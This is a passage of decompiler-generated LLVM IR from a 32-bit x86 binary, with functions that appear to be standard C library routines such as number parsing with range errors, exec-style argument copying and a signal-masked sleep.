  %v0_804e7f0 = phi i32 [ %v1_804e80f, %dec_label_pc_804e834 ], [ %v0_804e7f0.pre, %dec_label_pc_804e81e ]
  br label %dec_label_pc_804e7f2

dec_label_pc_804e7f2:                             ; preds = %dec_label_pc_804e7dd, %dec_label_pc_804e7f0
  %v0_804e84918 = phi i32 [ %v0_804e84920, %dec_label_pc_804e7dd ], [ %v0_804e7f0, %dec_label_pc_804e7f0 ]
  %v0_804e80f = phi i32 [ %v0_804e7f212, %dec_label_pc_804e7dd ], [ %v0_804e7f0, %dec_label_pc_804e7f0 ]
  %v4_804e7f2 = phi i32 [ %div, %dec_label_pc_804e7dd ], [ %v4_804e7f2.pre, %dec_label_pc_804e7f0 ]
  %v1_804e7f2 = inttoptr i32 %v0_804e80f to i8*
  %v2_804e7f2 = load i8, i8* %v1_804e7f2, align 1
  %v3_804e7f2 = zext i8 %v2_804e7f2 to i32
  %v5_804e7f2 = and i32 %v4_804e7f2, -256
  %v6_804e7f2 = or i32 %v3_804e7f2, %v5_804e7f2
  store i32 %v6_804e7f2, i32* %eax.global-to-local, align 4
  %v1_804e7f4 = add i32 %v6_804e7f2, -48
  %v1_804e7f7 = trunc i32 %v1_804e7f4 to i8
  %tmp54 = icmp ult i8 %v1_804e7f7, 10
  br i1 %tmp54, label %dec_label_pc_804e808, label %dec_label_pc_804e7fc

dec_label_pc_804e7fc:                             ; preds = %dec_label_pc_804e7f2
  %v1_804e7fc = or i32 %v6_804e7f2, 32
  %v3_804e7fc = trunc i32 %v1_804e7fc to i8
  store i32 %v1_804e7fc, i32* %eax.global-to-local, align 4
  %v1_804e7ff = and i32 %v1_804e7f4, -256
  %v2_804e7ff = or i32 %v1_804e7ff, 40
  %tmp55 = icmp ult i8 %v3_804e7fc, 97
  br i1 %tmp55, label %dec_label_pc_804e808, label %dec_label_pc_804e805

dec_label_pc_804e805:                             ; preds = %dec_label_pc_804e7fc
  %v1_804e805 = add i32 %v1_804e7fc, -87
  br label %dec_label_pc_804e808

dec_label_pc_804e808:                             ; preds = %dec_label_pc_804e7fc, %dec_label_pc_804e7f2, %dec_label_pc_804e805
  %v0_804e837 = phi i32 [ %v2_804e7ff, %dec_label_pc_804e7fc ], [ %v1_804e7f4, %dec_label_pc_804e7f2 ], [ %v1_804e805, %dec_label_pc_804e805 ]
  %v1_804e808 = urem i32 %v0_804e837, 256
  store i32 %v1_804e808, i32* %eax.global-to-local, align 4
  %v1_804e80b = load i32, i32* %esi.global-to-local, align 4
  %v2_804e80b = sub i32 %v1_804e808, %v1_804e80b
  %v10_804e80b = and i32 %v2_804e80b, %v1_804e80b
  %v11_804e80b = icmp slt i32 %v10_804e80b, 0
  %v13_804e80b = icmp slt i32 %v2_804e80b, 0
  %v2_804e80d = icmp eq i1 %v13_804e80b, %v11_804e80b
  br i1 %v2_804e80d, label %dec_label_pc_804e83e, label %dec_label_pc_804e80f

dec_label_pc_804e80f:                             ; preds = %dec_label_pc_804e808
  %v1_804e80f = add i32 %v0_804e80f, 1
  store i32 %v1_804e80f, i32* %ebx.global-to-local, align 4
  %v0_804e810 = load i32, i32* %edx.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_804e810, %div
  br i1 %tmp56, label %dec_label_pc_804e81e, label %dec_label_pc_804e816

dec_label_pc_804e816:                             ; preds = %dec_label_pc_804e80f
  %v15_804e810 = icmp eq i32 %v0_804e810, %div
  %v1_804e816 = icmp eq i1 %v15_804e810, false
  br i1 %v1_804e816, label %dec_label_pc_804e834, label %dec_label_pc_804e818

dec_label_pc_804e818:                             ; preds = %dec_label_pc_804e816
  %v1_804e818 = trunc i32 %v0_804e837 to i8
  %tmp57 = icmp ugt i8 %v1_804e818, %v1_804e7e4
  br i1 %tmp57, label %dec_label_pc_804e81e, label %dec_label_pc_804e834

dec_label_pc_804e81e:                             ; preds = %dec_label_pc_804e818, %dec_label_pc_804e80f
  store i32 %v4_804e81e, i32* %eax.global-to-local, align 4
  %v0_804e822 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e822 = and i32 %v0_804e822, %v4_804e81e
  store i32 %v2_804e822, i32* %ebp.global-to-local, align 4
  %v1_804e824 = call i32 @function_804b4bc(i32 %div)
  store i32 %v1_804e824, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804e82c = inttoptr i32 %v1_804e824 to i32*
  store i32 34, i32* %v1_804e82c, align 4
  %v0_804e7f0.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804e7f2.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e7f0

dec_label_pc_804e834:                             ; preds = %dec_label_pc_804e818, %dec_label_pc_804e816
  %v4_804e834 = mul i32 %v0_804e810, %v1_804e80b
  store i32 %v1_804e808, i32* %eax.global-to-local, align 4
  %v2_804e83a = add i32 %v4_804e834, %v1_804e808
  store i32 %v2_804e83a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e7f0

dec_label_pc_804e83e:                             ; preds = %dec_label_pc_804e808, %dec_label_pc_804e7d3
  %v0_804e849 = phi i32 [ %v0_804e84920, %dec_label_pc_804e7d3 ], [ %v0_804e84918, %dec_label_pc_804e808 ]
  %stack_var_-24.0 = phi i32 [ %tmp26, %dec_label_pc_804e7d3 ], [ %div, %dec_label_pc_804e808 ]
  %v4_804e83e = icmp eq i32 %arg2, 0
  br i1 %v4_804e83e, label %dec_label_pc_804e84b, label %dec_label_pc_804e845

dec_label_pc_804e845:                             ; preds = %dec_label_pc_804e83e
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804e849 = inttoptr i32 %arg2 to i32*
  store i32 %v0_804e849, i32* %v2_804e849, align 4
  br label %dec_label_pc_804e84b

dec_label_pc_804e84b:                             ; preds = %dec_label_pc_804e83e, %dec_label_pc_804e845
  %v0_804e84b = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804e84b, i32* %eax.global-to-local, align 4
  %v1_804e84d = trunc i32 %v0_804e84b to i8
  %v6_804e84d = icmp eq i8 %v1_804e84d, 0
  %v2_804e84f = zext i1 %v6_804e84d to i32
  %v1_804e8513 = or i32 %v2_804e84f, -2147483648
  store i32 %v1_804e8513, i32* %ebx.global-to-local, align 4
  %v5_804e857 = icmp eq i8 %tmp36, 0
  br i1 %v5_804e857, label %dec_label_pc_804e86f, label %dec_label_pc_804e85e

dec_label_pc_804e85e:                             ; preds = %dec_label_pc_804e84b
  %v0_804e85e = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_804e85e, %v1_804e8513
  br i1 %tmp58, label %dec_label_pc_804e862, label %dec_label_pc_804e86f

dec_label_pc_804e862:                             ; preds = %dec_label_pc_804e85e
  %v1_804e862 = call i32 @function_804b4bc(i32 %stack_var_-24.0)
  store i32 %v1_804e862, i32* %eax.global-to-local, align 4
  %v0_804e867 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804e867, i32* %edx.global-to-local, align 4
  %v1_804e869 = inttoptr i32 %v1_804e862 to i32*
  store i32 34, i32* %v1_804e869, align 4
  %v0_804e86f.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e86f

dec_label_pc_804e86f:                             ; preds = %dec_label_pc_804e85e, %dec_label_pc_804e84b, %dec_label_pc_804e862
  %v0_804e86f = phi i32 [ %v0_804e84b, %dec_label_pc_804e85e ], [ %v0_804e84b, %dec_label_pc_804e84b ], [ %v0_804e86f.pre, %dec_label_pc_804e862 ]
  store i32 %v0_804e86f, i32* %eax.global-to-local, align 4
  %v3_804e871 = trunc i32 %v0_804e86f to i8
  %v4_804e871 = icmp eq i8 %v3_804e871, 0
  %v0_804e87a.pre = load i32, i32* %edx.global-to-local, align 4
  br i1 %v4_804e871, label %dec_label_pc_804e877, label %dec_label_pc_804e875

dec_label_pc_804e875:                             ; preds = %dec_label_pc_804e86f
  %v1_804e875 = sub i32 0, %v0_804e87a.pre
  store i32 %v1_804e875, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e877

dec_label_pc_804e877:                             ; preds = %dec_label_pc_804e86f, %dec_label_pc_804e875
  %v0_804e87a = phi i32 [ %v1_804e875, %dec_label_pc_804e875 ], [ %v0_804e87a.pre, %dec_label_pc_804e86f ]
  store i32 %v0_804e87a, i32* %eax.global-to-local, align 4
  %v2_804e87c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e87c, i32* @ebx, align 4
  ret i32 %v0_804e87a

; uselistorder directives
  uselistorder i32 %v0_804e87a, { 1, 0 }
  uselistorder i32 %v0_804e86f, { 1, 0 }
  uselistorder i32 %v0_804e810, { 0, 2, 1 }
  uselistorder i32 %v1_804e80f, { 1, 0 }
  uselistorder i32 %v2_804e80b, { 1, 0 }
  uselistorder i32 %v1_804e808, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_804e837, { 1, 0 }
  uselistorder i32 %v0_804e7f0, { 1, 0 }
  uselistorder i32 %v4_804e81e, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_804e7e2, { 1, 0, 2 }
  uselistorder i32 %v2_804e7c6, { 1, 0 }
  uselistorder i32 %v1_804e7bf, { 1, 0 }
  uselistorder i32 %v1_804e7b8, { 1, 0, 2 }
  uselistorder i32 %v0_804e7b7, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_804e786.lcssa, { 1, 0 }
  uselistorder i32 %v0_804e785.lcssa, { 1, 0 }
  uselistorder i32 %v1_804e785, { 0, 3, 2, 1 }
  uselistorder i32 %v4_804e779, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_804e773, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 7, 1, 6, 2, 3, 4, 5, 8, 9 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -87, { 1, 0 }
  uselistorder i32 -17, { 8, 0, 2, 3, 4, 5, 6, 7, 1 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e877, { 1, 0 }
  uselistorder label %dec_label_pc_804e86f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e84b, { 1, 0 }
  uselistorder label %dec_label_pc_804e808, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e7f2, { 1, 0 }
  uselistorder label %dec_label_pc_804e7d3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e7c9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e7a5, { 1, 0 }
  uselistorder label %dec_label_pc_804e7a4, { 1, 0 }
  uselistorder label %dec_label_pc_804e785, { 1, 0 }
}

define i32 @function_804e884(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e884:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_804e897 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804e897, i32* @ebx, align 4
  %v2_804e89c = call i32 @function_804ec6e(i32 %v2_804e897, i32 134540395)
  %v1_804e8a8 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80559c0.169 to i32))
  %v0_804e8ad = load i32, i32* @global_var_80580a4.170, align 4
  store i32 %v0_804e8ad, i32* @eax, align 4
  %v1_804e8b5 = icmp eq i32 %v0_804e8ad, 0
  br i1 %v1_804e8b5, label %dec_label_pc_804e8c2, label %dec_label_pc_804e8b9

dec_label_pc_804e8b9:                             ; preds = %dec_label_pc_804e884
  %v0_804e8bc = load i32, i32* @esi, align 4
  %v1_804e8bd = call i32 @unknown_0(i32 %v0_804e8bc)
  store i32 %v1_804e8bd, i32* @eax, align 4
  br label %dec_label_pc_804e8c2

dec_label_pc_804e8c2:                             ; preds = %dec_label_pc_804e884, %dec_label_pc_804e8b9
  %v2_804e8c7 = call i32 @function_804ec6e(i32 %v2_804e897, i32 1)
  %v0_804e8cc = call i32 @function_804ec2c()
  %v0_804e8dd = call i32 @function_804bc38()
  %v0_804e8e5 = load i32, i32* @esi, align 4
  %v1_804e8e6 = call i32 @function_804f0c0(i32 %v0_804e8e5)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_804f0c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e8c2, { 1, 0 }
}

define i32 @function_804e8ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804e8ec:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804e8f0 = load i32, i32* @ebx, align 4
  store i32 %v0_804e8f0, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804e8f3 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_804e8f3, i32* %eax.global-to-local, align 4
  %v12_804e8f6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804e8fc

dec_label_pc_804e8fc:                             ; preds = %dec_label_pc_804e8fc, %dec_label_pc_804e8ec
  %v0_804e8ff = phi i32 [ 0, %dec_label_pc_804e8ec ], [ %v1_804e8ff, %dec_label_pc_804e8fc ]
  %stack_var_-16.0 = phi i32 [ %v2_804e8f3, %dec_label_pc_804e8ec ], [ %v1_804e900, %dec_label_pc_804e8fc ]
  %v1_804e8ff = add i32 %v0_804e8ff, 1
  store i32 %v1_804e8ff, i32* %esi.global-to-local, align 4
  %v1_804e900 = add i32 %stack_var_-16.0, 4
  store i32 %v1_804e900, i32* %eax.global-to-local, align 4
  %v1_804e906 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_804e906 = load i32, i32* %v1_804e906, align 4
  %v3_804e906 = icmp eq i32 %v2_804e906, 0
  %v1_804e909 = icmp eq i1 %v3_804e906, false
  br i1 %v1_804e909, label %dec_label_pc_804e8fc, label %dec_label_pc_804e90b

dec_label_pc_804e90b:                             ; preds = %dec_label_pc_804e8fc
  %v1_804e90b = mul i32 %v1_804e8ff, 4
  %v2_804e90b = add i32 %v1_804e90b, 34
  %v1_804e912 = and i32 %v2_804e90b, -16
  %v2_804e915 = sub i32 %v12_804e8f6, %v1_804e912
  %v1_804e91a = add i32 %v2_804e915, 15
  %v1_804e91e = and i32 %v1_804e91a, -16
  store i32 %v1_804e91e, i32* @ebx, align 4
  store i32 %v1_804e91e, i32* %ecx.global-to-local, align 4
  %v2_804e923 = inttoptr i32 %v1_804e91e to i32*
  store i32 %arg2, i32* %v2_804e923, align 16
  store i32 %v2_804e8f3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e92b

dec_label_pc_804e92b:                             ; preds = %dec_label_pc_804e92b, %dec_label_pc_804e90b
  %stack_var_-16.1 = phi i32 [ %v2_804e8f3, %dec_label_pc_804e90b ], [ %v1_804e932, %dec_label_pc_804e92b ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_804e92e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e92e = add i32 %v0_804e92e, 4
  store i32 %v1_804e92e, i32* %ecx.global-to-local, align 4
  %v0_804e931 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e931 = add i32 %v0_804e931, -1
  %v8_804e931 = icmp eq i32 %v1_804e931, 0
  store i32 %v1_804e931, i32* %esi.global-to-local, align 4
  %v1_804e932 = add i32 %stack_var_-16.1, 4
  %v1_804e938 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_804e938 = load i32, i32* %v1_804e938, align 4
  store i32 %v2_804e938, i32* %eax.global-to-local, align 4
  %v2_804e93a = inttoptr i32 %v1_804e92e to i32*
  store i32 %v2_804e938, i32* %v2_804e93a, align 4
  %v1_804e93c = icmp eq i1 %v8_804e931, false
  br i1 %v1_804e93c, label %dec_label_pc_804e92b, label %dec_label_pc_804e93e

dec_label_pc_804e93e:                             ; preds = %dec_label_pc_804e92b
  %v0_804e93e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e93e = load i32, i32* @esp, align 4
  %v2_804e93e = add i32 %v1_804e93e, -4
  %v3_804e93e = inttoptr i32 %v2_804e93e to i32*
  store i32 %v0_804e93e, i32* %v3_804e93e, align 4
  %v0_804e93f = load i32, i32* @global_var_80580ac.171, align 4
  %v2_804e93f = add i32 %v1_804e93e, -8
  %v3_804e93f = inttoptr i32 %v2_804e93f to i32*
  store i32 %v0_804e93f, i32* %v3_804e93f, align 4
  %v0_804e945 = load i32, i32* @ebx, align 4
  %v2_804e945 = add i32 %v1_804e93e, -12
  %v3_804e945 = inttoptr i32 %v2_804e945 to i32*
  store i32 %v0_804e945, i32* %v3_804e945, align 4
  %v5_804e946 = add i32 %v1_804e93e, -16
  %v6_804e946 = inttoptr i32 %v5_804e946 to i32*
  store i32 %arg1, i32* %v6_804e946, align 4
  %v1_804e949 = inttoptr i32 %v1_804e932 to i8*
  %v2_804e949 = call i32 @function_804f150(i8* %v1_804e949)
  store i32 %v2_804e949, i32* %eax.global-to-local, align 4
  %v2_804e951 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e951, i32* @ebx, align 4
  ret i32 %v2_804e949

; uselistorder directives
  uselistorder i32 %v1_804e931, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_804e900, { 1, 0 }
  uselistorder i32 %v1_804e8ff, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804e8f3, { 0, 2, 1, 3 }
}

define i32 @function_804e958(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e958:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_804e958 = load i32, i32* @ebp, align 4
  %v0_804e959 = load i32, i32* @edi, align 4
  %v0_804e95a = load i32, i32* @esi, align 4
  %v0_804e95b = load i32, i32* @ebx, align 4
  %v15_804e95c = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804e96e = icmp eq i32 %arg1, 0
  %v1_804e970 = icmp eq i1 %v1_804e96e, false
  br i1 %v1_804e970, label %dec_label_pc_804e982.preheader, label %dec_label_pc_804eacf

dec_label_pc_804e982.preheader:                   ; preds = %dec_label_pc_804e958
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e977

dec_label_pc_804e977:                             ; preds = %dec_label_pc_804e977.dec_label_pc_804e977_crit_edge, %dec_label_pc_804e982.preheader
  %v0_804e977 = phi i32 [ %v15_804e95c, %dec_label_pc_804e982.preheader ], [ %v0_804e977.pre, %dec_label_pc_804e977.dec_label_pc_804e977_crit_edge ]
  %v1_804e98229 = phi i32 [ 31, %dec_label_pc_804e982.preheader ], [ %v1_804e982, %dec_label_pc_804e977.dec_label_pc_804e977_crit_edge ]
  %v2_804e977 = mul i32 %v1_804e98229, 4
  %v3_804e977 = add i32 %v2_804e977, 292
  %v4_804e977 = add i32 %v3_804e977, %v0_804e977
  %v5_804e977 = inttoptr i32 %v4_804e977 to i32*
  store i32 0, i32* %v5_804e977, align 4
  %v0_804e982.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804e982 = add i32 %v0_804e982.pre, -1
  %v9_804e982 = icmp slt i32 %v1_804e982, 0
  store i32 %v1_804e982, i32* %eax.global-to-local, align 4
  %v1_804e983 = icmp eq i1 %v9_804e982, false
  br i1 %v1_804e983, label %dec_label_pc_804e977.dec_label_pc_804e977_crit_edge, label %dec_label_pc_804e985

dec_label_pc_804e977.dec_label_pc_804e977_crit_edge: ; preds = %dec_label_pc_804e977
  %v0_804e977.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e977

dec_label_pc_804e985:                             ; preds = %dec_label_pc_804e977
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804e99b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804e99b, i32* @ebx, align 4
  store i32 %v2_804e99b, i32* %stack_var_-460, align 4
  %v4_804e9a3 = call i32 @function_8050c28(i32 %v2_804e99b, i32 17, i32 %v1_804e982, i32 %v1_804e982)
  store i32 %v4_804e9a3, i32* %eax.global-to-local, align 4
  %v2_804e9ab = icmp slt i32 %v4_804e9a3, 0
  br i1 %v2_804e9ab, label %dec_label_pc_804ead3, label %dec_label_pc_804e9b3

dec_label_pc_804e9b3:                             ; preds = %dec_label_pc_804e985
  %v2_804e9b4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_804e9b4, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_804e9bf = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_804e9bf = call i32 @function_804f3e4(i32 0, %_TYPEDEF_sigset_t* %v3_804e9bf, i32 %v2_804e9b4)
  store i32 %v4_804e9bf, i32* %eax.global-to-local, align 4
  %v1_804e9c7 = icmp eq i32 %v4_804e9bf, 0
  %v1_804e9c9 = icmp eq i1 %v1_804e9c7, false
  br i1 %v1_804e9c9, label %dec_label_pc_804ead3, label %dec_label_pc_804e9cf

dec_label_pc_804e9cf:                             ; preds = %dec_label_pc_804e9b3
  store i32 %v2_804e9b4, i32* %stack_var_-460, align 4
  %v4_804e9d4 = call i32 @function_8050c04(i32 %v2_804e9b4, i32 17, i32 %v4_804e9bf, i32 %v4_804e9bf)
  store i32 %v4_804e9d4, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_804e9e1 = icmp eq i32 %v4_804e9d4, 0
  br i1 %v1_804e9e1, label %dec_label_pc_804e9f5.preheader, label %dec_label_pc_804ea9d

dec_label_pc_804e9f5.preheader:                   ; preds = %dec_label_pc_804e9cf
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e9ea

dec_label_pc_804e9ea:                             ; preds = %dec_label_pc_804e9ea.dec_label_pc_804e9ea_crit_edge, %dec_label_pc_804e9f5.preheader
  %v0_804e9ea = phi i32 [ %v15_804e95c, %dec_label_pc_804e9f5.preheader ], [ %v0_804e9ea.pre, %dec_label_pc_804e9ea.dec_label_pc_804e9ea_crit_edge ]
  %v1_804e9f528 = phi i32 [ 31, %dec_label_pc_804e9f5.preheader ], [ %v1_804e9f5, %dec_label_pc_804e9ea.dec_label_pc_804e9ea_crit_edge ]
  %v2_804e9ea = mul i32 %v1_804e9f528, 4
  %v3_804e9ea = add i32 %v2_804e9ea, 292
  %v4_804e9ea = add i32 %v3_804e9ea, %v0_804e9ea
  %v5_804e9ea = inttoptr i32 %v4_804e9ea to i32*
  store i32 0, i32* %v5_804e9ea, align 4
  %v0_804e9f5.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_804e9f5 = add i32 %v0_804e9f5.pre, -1
  %v9_804e9f5 = icmp slt i32 %v1_804e9f5, 0
  store i32 %v1_804e9f5, i32* %edx.global-to-local, align 4
  %v1_804e9f6 = icmp eq i1 %v9_804e9f5, false
  br i1 %v1_804e9f6, label %dec_label_pc_804e9ea.dec_label_pc_804e9ea_crit_edge, label %dec_label_pc_804e9f8

dec_label_pc_804e9ea.dec_label_pc_804e9ea_crit_edge: ; preds = %dec_label_pc_804e9ea
  %v0_804e9ea.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e9ea

dec_label_pc_804e9f8:                             ; preds = %dec_label_pc_804e9ea
  store i32 %v2_804e99b, i32* %eax.global-to-local, align 4
  store i32 %v2_804e99b, i32* %stack_var_-460, align 4
  %v4_804ea04 = call i32 @function_8050c28(i32 %v2_804e99b, i32 17, i32 0, i32 0)
  store i32 %v4_804ea04, i32* %eax.global-to-local, align 4
  %v2_804ea0c = icmp slt i32 %v4_804ea04, 0
  br i1 %v2_804ea0c, label %dec_label_pc_804ead3, label %dec_label_pc_804ea14

dec_label_pc_804ea14:                             ; preds = %dec_label_pc_804e9f8
  %v2_804ea15 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_804ea15, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v5_804ea1e = call i32 @function_804eeab(i32 17, i32* null, i32 %v2_804ea15, i32 %v4_804ea04)
  store i32 %v5_804ea1e, i32* %eax.global-to-local, align 4
  %v2_804ea26 = icmp slt i32 %v5_804ea1e, 0
  %v1_804ea28 = icmp eq i1 %v2_804ea26, false
  br i1 %v1_804ea28, label %dec_label_pc_804ea52, label %dec_label_pc_804ea2a

dec_label_pc_804ea2a:                             ; preds = %dec_label_pc_804ea14
  %v0_804ea2a = load i32, i32* %stack_var_-460, align 4
  %v1_804ea2a = call i32 @function_804b4bc(i32 %v0_804ea2a)
  store i32 %v1_804ea2a, i32* %eax.global-to-local, align 4
  store i32 %v1_804ea2a, i32* @ebx, align 4
  %v1_804ea31 = inttoptr i32 %v1_804ea2a to i32*
  %v2_804ea31 = load i32, i32* %v1_804ea31, align 4
  store i32 %v2_804ea31, i32* @esi, align 4
  store i32 %v2_804e9b4, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804ea40 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804ea40 = call i32 @function_804f3e4(i32 2, %_TYPEDEF_sigset_t* %v3_804ea40, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804ea4b = load i32, i32* @esi, align 4
  %v1_804ea4b = load i32, i32* @ebx, align 4
  %v2_804ea4b = inttoptr i32 %v1_804ea4b to i32*
  store i32 %v0_804ea4b, i32* %v2_804ea4b, align 4
  %v0_804eae0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ead6

dec_label_pc_804ea52:                             ; preds = %dec_label_pc_804ea14
  %v3_804ea52 = load i32, i32* %stack_var_-420, align 4
  %v12_804ea52 = icmp eq i32 %v3_804ea52, 1
  %v2_804ea5e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ea5e, i32* @ebx, align 4
  %v1_804ea65 = icmp eq i1 %v12_804ea52, false
  br i1 %v1_804ea65, label %dec_label_pc_804ea8c, label %dec_label_pc_804ea67

dec_label_pc_804ea67:                             ; preds = %dec_label_pc_804ea52
  %v0_804ea67 = load i32, i32* @edi, align 4
  store i32 %v2_804ea5e, i32* %stack_var_-460, align 4
  %v4_804ea6b = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804ea6b = call i32 @function_804f2cc(%timespec* %v4_804ea6b, i32 %v2_804ea5e, i32 %v0_804ea67, i32 %v0_804ea67)
  store i32 %v5_804ea6b, i32* %eax.global-to-local, align 4
  store i32 %v5_804ea6b, i32* @edi, align 4
  %v1_804ea72 = call i32 @function_804b4bc(i32 %v2_804ea5e)
  store i32 %v1_804ea72, i32* %eax.global-to-local, align 4
  store i32 %v1_804ea72, i32* @ebx, align 4
  %v1_804ea7c = inttoptr i32 %v1_804ea72 to i32*
  %v2_804ea7c = load i32, i32* %v1_804ea7c, align 4
  store i32 %v2_804ea7c, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804ea83 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804ea83 = call i32 @function_804f3e4(i32 2, %_TYPEDEF_sigset_t* %v3_804ea83, i32 0)
  store i32 %v4_804ea83, i32* %eax.global-to-local, align 4
  %v0_804ea88 = load i32, i32* @esi, align 4
  %v1_804ea88 = load i32, i32* @ebx, align 4
  %v2_804ea88 = inttoptr i32 %v1_804ea88 to i32*
  store i32 %v0_804ea88, i32* %v2_804ea88, align 4
  %v0_804eab2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804eaaf

dec_label_pc_804ea8c:                             ; preds = %dec_label_pc_804ea52
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804ea92 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804ea92 = call i32 @function_804f3e4(i32 2, %_TYPEDEF_sigset_t* %v3_804ea92, i32 0)
  store i32 %v4_804ea92, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eaa8

dec_label_pc_804ea9d:                             ; preds = %dec_label_pc_804e9cf
  %v2_804ea9f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ea9f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eaa8

dec_label_pc_804eaa8:                             ; preds = %dec_label_pc_804ea8c, %dec_label_pc_804ea9d
  %storemerge3.pre-phi = phi i32 [ %v2_804ea5e, %dec_label_pc_804ea8c ], [ %v2_804ea9f, %dec_label_pc_804ea9d ]
  %v3_804eaa8 = phi i32 [ %v2_804e9b4, %dec_label_pc_804ea8c ], [ %v4_804e9d4, %dec_label_pc_804ea9d ]
  %v2_804eaa8 = phi i32 [ 0, %dec_label_pc_804ea8c ], [ %v4_804e9d4, %dec_label_pc_804ea9d ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_804eaa8 = bitcast i32* %stack_var_-24 to %timespec*
